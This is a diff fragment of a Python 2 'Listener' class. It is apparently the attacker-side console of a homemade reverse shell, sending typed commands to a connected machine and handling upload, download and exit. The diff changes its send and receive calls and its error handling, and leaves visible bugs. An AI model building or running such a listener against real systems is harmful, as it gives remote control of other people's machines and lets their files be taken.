@@ -32,9 +32,9 @@ class Listener:
         if command [0] == "exit":
             self.connection.close()
             exit()
-
-        self.connection.send (command)
-        return self.connection.recv(1024)
+            
+        self.reliable_send(command)
+        return self.reliable_recieve()
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
@@ -49,7 +49,6 @@ class Listener:
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
-
             try:
                 if command[0] == "upload":
                     file_content = self.read_file(command[1])
@@ -58,11 +57,12 @@ class Listener:
                 result = self.execute_remotely(command)
                 
                 if command[0] == "download" and not "[-] Error " not in result:
-                    result = self.write_file(result)
-            except Exception:
+                    command_result = self.write_file(result)
+            except Exception as err:
+                print(err)
                 command_result = "[-] Error during comand execution."
 
-            print(result)
+            print(command_result)
 
 
 args = get_arguments()
